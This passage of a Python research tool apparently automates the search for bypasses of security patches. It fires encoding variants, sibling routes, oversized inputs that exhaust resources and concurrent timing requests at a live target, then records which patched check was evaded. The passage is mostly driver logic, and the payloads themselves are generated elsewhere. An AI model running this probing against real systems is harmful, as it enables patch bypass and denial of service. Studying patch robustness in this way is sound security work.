            predicate = _emit_artifact(pkg, cand, p, O, sentinels, graph_manifest,
                                       label_mode)
            ledger["probes_fired"] = fired
            ledger["elapsed_s"] = round(time.time() - t0, 1)
            ledger["bypassed_predicate"] = (predicate or {}).get("text")
            return {"status": "SOLVED", "strategy": "B", "family": p["family"],
                    "origin": p["origin"], "token": m.group(0),
                    "predicate_named": bool(predicate), "ledger": ledger}
    ledger["probes_fired_encoding"] = fired
    ledger["probes_fired"] = ledger.get("probes_fired", 0) + fired
    return None


# ── strategy A: coverage residuals via sibling replay ────────────────────

def run_siblings(cand, label_mode, dispatch, fn_index, call_edges, sinks,
                 seed_literals, model_siblings, host, port, ledger, t0,
                 pkg, O, sentinels, graph_manifest, probes):
    admitted, hypothesized = [], 0
    for d in dispatch:
        ok, status, res = admit_sibling(d, fn_index, len(admitted))
        if ok:
            d["resolution"] = res
            admitted.append(d)
        elif status in ("one-to-many", "budget"):
            hypothesized += 1
    # model-proposed sibling tier: passes the same conditions or stays
    # hypothesized (bare routes admitted only if present in the source)
    for ms in model_siblings or []:
        if re.match(r"^/[\w./:*\-{}]*$", str(ms)) and not budget_over(admitted):
            admitted.append({"file": "model-proposed", "line": 0, "call": "",
                             "literal": str(ms), "lang": "", "caller": "",
                             "handler": None, "route_like": True,
                             "resolution": "model-proposed"})
    patched_dirs = frozenset({os.path.dirname(g["file"]) for g in O.get("guards", [])
                              if g.get("file")} |
                             {os.path.dirname(p["file"]) for p in O.get("predicates", [])
                              if p.get("file")})
    ranked = rank_siblings(admitted, seed_literals, sinks, call_edges,
                           patched_dirs)[:K_SIBLINGS]
    ledger["siblings"] = {"admitted": len(admitted), "hypothesized": hypothesized,
                          "replayed": min(len(ranked), K_SIBLINGS)}
    fired = 0
    for d in ranked[:MAX_REFERENCES]:
        if fired >= probes:
            break
        sib = dict(cand)
        sib["path"] = d["literal"]
        text = fire(sib, "path", d["literal"], host, port)
        fired += 1
        m = _match_hit(text, label_mode)
        ledger["provenance"].append({"family": f"sibling:{d['literal'][:40]}",
                                     "origin": "model-proposed" if d["file"] == "model-proposed"
                                               else "registered",
                                     "slot": "path", "value": d["literal"][:120],
                                     "hit": bool(m), "file": d["file"]})
        if m:
            win = {"slot": "path", "value": d["literal"],
                   "family": f"sibling:{d['literal'][:24]}", "origin": "carrier"}
            predicate = _emit_artifact(pkg, sib, win, O, sentinels, graph_manifest,
                                       label_mode, base_value=str(cand.get("path", "")))
            ledger["probes_fired"] = fired
            ledger["elapsed_s"] = round(time.time() - t0, 1)
            ledger["bypassed_predicate"] = (predicate or {}).get("text")
            return {"status": "SOLVED", "strategy": "A", "family": win["family"],
                    "origin": "carrier", "token": m.group(0),
                    "predicate_named": bool(predicate), "ledger": ledger}
    ledger["probes_fired_siblings"] = fired
    return None


def budget_over(admitted):
    return len(admitted) >= K_SIBLINGS


# ── strategy C: tails (paper §5.5) ───────────────────────────────────────

def run_tail_resource(cand, label_mode, host, port, ledger, t0, pkg, O,
                      sentinels, graph_manifest, probes):
    """Resource exhaustion: candidates at increasing lengths beside a benign
    control; a watchdog withholds the flag until health checks fail."""
    slots = mutatable_targets(cand)
    if not slots:
        return None
    slot = slots[0]
    base = str(cand[slot])
    unit = re.search(r"[^/?&=]{1}", base)
    unit = unit.group(0) if unit else "a"
    hit = None
    m = None
    fired = 0
    for mult in (4, 16, 64, 256):
        n = min(len(base) * mult, 65536)
        if fired >= probes * 2:
            break
        benign_val = "x" * n
        fire(cand, slot, benign_val, host, port)  # benign control
        fired += 1
        text = fire(cand, slot, unit * n, host, port)
        fired += 1
        m = _match_hit(text, label_mode)
        ledger["provenance"].append({"family": f"resource-exhaustion:n={n}",
                                     "origin": "registered", "slot": slot,
                                     "value": f"({unit})*{n}", "hit": bool(m)})
        if m:
            hit = (slot, unit * n, n)
            break
        if not health_ok(host, port):
            time.sleep(5)
            if not health_ok(host, port):
                hit = (slot, unit * n, n)  # effect without flag: emit anyway
                ledger["watchdog"] = f"health-failed-after-n={n}"
                break
    if not hit:
        return None
    win = {"slot": hit[0], "value": hit[1], "family": "resource-exhaustion",
           "origin": "tail"}
    cand_t = dict(cand)
    predicate = _emit_artifact(pkg, cand_t, win, O, sentinels, graph_manifest,
                               label_mode, benign="x" * min(hit[2], 4096))
    ledger["probes_fired"] = ledger.get("probes_fired", 0) + fired
    ledger["elapsed_s"] = round(time.time() - t0, 1)
    ledger["bypassed_predicate"] = (predicate or {}).get("text")
    return {"status": "SOLVED", "strategy": "C-tail", "family": "resource-exhaustion",
            "origin": "tail", "token": (m.group(0) if m else "health-collapse"),
            "predicate_named": bool(predicate), "ledger": ledger}


def run_tail_timing(cand, label_mode, host, port, ledger, t0, pkg, O,
                    sentinels, graph_manifest, probes):
    """Timing / re-resolution: concurrent requests beside a no-concurrency
    control, replayed until the effect appears on live V1."""
    slots = mutatable_targets(cand)
    if not slots:
        return None
    slot = slots[0]
    base = str(cand[slot])
    control = fire(cand, slot, base, host, port)
    if _match_hit(control, label_mode):
        ledger["timing_control"] = "control-hit (not concurrency-gated)"
    fired = 1
    for replay in range(MAX_REFERENCES):
        if fired >= probes * 4:
            break
        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
            texts = list(ex.map(lambda _: fire(cand, slot, base, host, port),
                                range(8)))
        fired += 8
        m = next((_match_hit(t, label_mode) for t in texts
                  if _match_hit(t, label_mode)), None)
        ledger["provenance"].append({"family": f"timing-concurrency:r={replay + 1}",
                                     "origin": "tail", "slot": slot,
                                     "value": base[:120], "hit": bool(m)})
        if m:
            win = {"slot": slot, "value": base, "family": "timing-concurrency",
                   "origin": "tail"}
            predicate = _emit_artifact(pkg, dict(cand), win, O, sentinels,
                                       graph_manifest, label_mode)
            ledger["probes_fired"] = fired
            ledger["elapsed_s"] = round(time.time() - t0, 1)
            ledger["bypassed_predicate"] = (predicate or {}).get("text")
            return {"status": "SOLVED", "strategy": "C-time",
                    "family": "timing-concurrency", "origin": "tail",
                    "token": m.group(0), "predicate_named": bool(predicate),
                    "ledger": ledger}
    ledger["probes_fired_timing"] = fired
    return None


# ═══════════════════════════════════════════════════════════════════════
# Pipeline driver
# ═══════════════════════════════════════════════════════════════════════

def _load_json(path, default):
    try:
        return json.load(open(path))
    except Exception:
        return default


def run(pkg: str, strategy: str, probes: int, skip_codeql: bool = False,
        dry_run: bool = False):
    t0 = time.time()
    paper_budget = probes <= N_PROBES
    ledger = {"pkg": pkg, "families_manifest": FAMILIES_MANIFEST,
              "budgets": {"N": N_PROBES, "probe_s": BUDGET_PROBE_S,
                          "K": K_SIBLINGS, "max_references": MAX_REFERENCES,
                          "used_probes": probes,
                          "budget_mode": "paper" if paper_budget else "extended"},
              "provenance": [], "probes_fired": 0}
    port = None
    try:
        port = int(json.load(open(os.path.join(pkg, "env.json")))["port"])
    except Exception:
        port = int(os.environ.get("PCB_PORT", "0"))
    host = os.environ.get("PCB_HOST", "10.7.0.11")
    if dry_run:
        pass  # EXTRACT/BUILD only: no live target required
    elif not port:
        return {"status": "no-live-target", "ledger": ledger}
    elif not wait_for_live(host, port):
        return {"status": "no-live-target", "ledger": ledger}
    if port is None:
        port = 0

    # ── EXTRACT ─────────────────────────────────────────────────────────
    cand, label_mode = load_seed_candidate(os.path.join(pkg, "poc", "original_test.py"))
    if cand is None:
        ledger["status"] = "non-declarative-seed"
        return {"status": "non-declarative-seed", "ledger": ledger}
    cand = flatten_candidate(cand)
    P = {"request": cand, "dangerous_spans": dangerous_spans(cand),
         "assertion_literals": [v for _, v in assertion_literals(cand)][:8]}
    patch_text = ""
    try:
        patch_text = open(os.path.join(pkg, "patch.diff"), errors="replace").read()
    except OSError:
        return {"status": "no-patch", "ledger": ledger}
    v1_dir = os.path.join(pkg, "v1_source")
    if os.path.islink(v1_dir):
        v1_dir = os.path.realpath(v1_dir)
    try:
        O = pcg_graph.ast_predicates(patch_text, v1_dir if os.path.isdir(v1_dir) else "")
        if not O["predicates"]:
            raise ValueError("no predicates found")
    except Exception:
        O = _regex_predicates(os.path.join(pkg, "patch.diff"))
    ledger["O"] = {"engine": O["engine"], "n_predicates": len(O["predicates"]),
                   "sentinels": O["literals"][:12]}
    if not O["predicates"]:
        return {"status": "no-changed-predicate", "ledger": ledger}
    sentinels = O["literals"][:12]

    # ── EXTRACT D + BUILD (graph) ───────────────────────────────────────
    dispatch, fn_index, call_edges = [], {}, []
    codeql_rows, codeql_note = [], "skipped:no-source"
    if os.path.isdir(v1_dir):
        langs = pcg_graph.detect_langs(v1_dir, patch_text)
        dispatch, fn_index, call_edges = pcg_graph.scan_dispatch_points(v1_dir, langs)
        if not skip_codeql and os.environ.get("PCG_CODEQL", "1") != "0":
            budget = int(os.environ.get("PCG_CODEQL_BUDGET", "240"))
            # script-first: build-free extractions before any compiled language
            preferred = [l for l in ("javascript", "typescript", "python",
                                     "go", "php", "ruby", "java", "c")
                         if l in langs]
            if os.environ.get("PCG_CODEQL_ALL") != "1":
                preferred = [l for l in preferred if l not in ("java", "c")]
            notes = []
            for lang in preferred[:2]:
                rows, note = pcg_graph.codeql_extract(v1_dir, lang, pkg, budget)
                codeql_rows.extend(rows)
                notes.append(f"{lang}:{note}")
                if rows:
                    break
            codeql_note = "|".join(notes) or "skipped:no-eligible-lang"
    model_edges = _load_json(os.path.join(pkg, "work", "model_edges.json"), [])
    graph = pcg_graph.build_graph(pkg, patch_text, O, P, dispatch, fn_index,
                                  call_edges, codeql_rows, codeql_note, model_edges)
    graph_manifest = pcg_graph.manifest_hash(graph)
    ledger["graph"] = {"manifest": graph_manifest,
                       "accounting": graph["accounting"],
                       "extractor_notes": graph["extractor_notes"]}
    pcg_graph.write_graph(graph, pkg)

    # guard follower: strict polarity precondition; variants keyed by the
    # dangerous span so they substitute into the slot value in place
    guard_variants = {}
    for g in O.get("guards", []):
        if g.get("polarity") not in ("strict", "filter"):
            continue
        lang = pcg_graph._EXT_LANG.get(os.path.splitext(g["file"])[1], "javascript")
        body = g["body"]
        # Clean-type normalization may sit elsewhere in the same file
        gfile = os.path.join(v1_dir, g["file"]) if v1_dir else g["file"]
        if os.path.isfile(gfile):
            try:
                body = body + "\n" + open(gfile, errors="replace").read()[:200000]
            except OSError:
                pass
        for span in P["dangerous_spans"]:
            for gv in pcg_graph.guard_follower_variants(span, body, lang):
                bucket = guard_variants.setdefault(span, [])
                if gv not in bucket:
                    bucket.append(gv)
        for gv in pcg_graph.clean_collapse_variants(body):
            bucket = guard_variants.setdefault("__prefix__", [])
            if gv not in bucket:
                bucket.append(gv)
    guard_variants = {k: v[:8] for k, v in list(guard_variants.items())[:8]}
    if guard_variants:
        ledger["guard_follower"] = {k: v for k, v in guard_variants.items()}

    model_variants = [{"slot": mv.get("slot", "path"), "value": mv.get("value", ""),
                       "family": "model-proposed", "origin": "model-proposed"}
                      for mv in _load_json(os.path.join(pkg, "work", "model_variants.json"), [])
                      if isinstance(mv, dict) and mv.get("value")]
    model_siblings = _load_json(os.path.join(pkg, "work", "model_siblings.json"), [])
    sinks = {row["callee"] for row in codeql_rows if row.get("kind") == "sinks"}
    sinks |= {ident for p in O["predicates"]
              for ident in re.findall(r"[A-Za-z_]\w{3,}", p["text"]) if ident in fn_index}
    seed_literals = list(P["assertion_literals"]) + list(P["dangerous_spans"])

    # ── EXECUTE (per matched pattern) ───────────────────────────────────
    if dry_run:
        ledger["plan_preview"] = [
            {"family": p["family"], "origin": p["origin"], "slot": p["slot"]}
            for p in build_probe_plan(cand, sentinels, guard_variants,
                                      model_variants)[:16]]
        ledger["siblings_preview"] = sorted(
            {d["literal"] for d in dispatch if admit_sibling(d, fn_index, 0)[0]})[:K_SIBLINGS]
        ledger["elapsed_s"] = round(time.time() - t0, 1)
        return {"status": "DRY-RUN", "ledger": ledger}

    patch_blob = patch_text + json.dumps(P["request"])
    def solved(out):
        return out and out.get("status") == "SOLVED"

    out = None
    if strategy in ("B", "auto"):
        out = run_encoding(cand, label_mode, O, sentinels, guard_variants,
                           model_variants, host, port, probes, ledger, t0, pkg,
                           graph_manifest)
        if solved(out):
            return out
    if strategy in ("A", "auto"):
        out = run_siblings(cand, label_mode, dispatch, fn_index, call_edges,
                           sinks, seed_literals, model_siblings, host, port,
                           ledger, t0, pkg, O, sentinels, graph_manifest, probes)
        if solved(out):
            return out
    if strategy in ("D", "auto"):
        out = run_sidecast(cand, O, sentinels, graph_manifest, pkg, ledger,
                           t0, host, port, probes)
        if out and out.get("status") == "SIDECAST":
            return out
    if strategy in ("C-tail", "auto") and (
            strategy == "C-tail" or CUE_RESOURCE_RE.search(patch_blob)
            or any(k in cand for k in ("n", "count", "iterations", "length"))):
        out = run_tail_resource(cand, label_mode, host, port, ledger, t0, pkg,
                                O, sentinels, graph_manifest, probes)
        if solved(out):
            return out
    if strategy in ("C-time", "auto") and (
            strategy == "C-time" or CUE_TIMING_RE.search(patch_blob)):
        out = run_tail_timing(cand, label_mode, host, port, ledger, t0, pkg,
                              O, sentinels, graph_manifest, probes)
        if solved(out):
            return out

    # settle passes: planted artifacts can lag HTTP warm-up by minutes under
    # emulation; retry the top of the plan on a graded schedule within budget
    if strategy in ("B", "auto") and not label_mode and ledger.get("probes_fired_encoding"):
        plan = build_probe_plan(cand, sentinels, guard_variants, model_variants)
        for settle_s in (20, 45, 60, 120):
            if time.time() - t0 > 420:
                break
            time.sleep(settle_s)
            for p in plan[:probes]:
                text = fire(cand, p["slot"], p["value"], host, port)
                m = _match_hit(text, label_mode)
                ledger["provenance"].append({"family": p["family"], "origin": p["origin"],
                                             "slot": p["slot"], "value": p["value"][:120],
                                             "hit": bool(m), "pass": "settle"})
                if m:
                    predicate = _emit_artifact(pkg, cand, p, O, sentinels,
                                               graph_manifest, label_mode)
                    ledger["elapsed_s"] = round(time.time() - t0, 1)
                    ledger["bypassed_predicate"] = (predicate or {}).get("text")
                    return {"status": "SOLVED", "strategy": "B", "family": p["family"],
                            "origin": p["origin"], "token": m.group(0),
                            "predicate_named": bool(predicate), "ledger": ledger}

    ledger["elapsed_s"] = round(time.time() - t0, 1)
    ledger["accounting"] = ledger.get("graph", {}).get("accounting")
    return {"status": "closure-within-bound", "ledger": ledger}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("pkg")
    ap.add_argument("--strategy", default="auto",
                    choices=("auto", "A", "B", "C-tail", "C-time", "D"))
    ap.add_argument("--probes", type=int, default=N_PROBES)
    ap.add_argument("--skip-codeql", action="store_true")
    ap.add_argument("--dry-run", action="store_true",
                    help="EXTRACT+BUILD only: no live probing")
    a = ap.parse_args()
    out = run(a.pkg, a.strategy, a.probes, a.skip_codeql, a.dry_run)
    print(json.dumps({k: v for k, v in out.items() if k != "ledger"},
                     ensure_ascii=False))
    with open(os.path.join(a.pkg, "work", "pcg_core_ledger.json"), "w") as f:
        os.makedirs(os.path.dirname(f.name), exist_ok=True)
        json.dump(out.get("ledger", {}), f, indent=1)
    sys.exit(0 if out["status"] == "SOLVED" else 1)


if __name__ == "__main__":
    main()
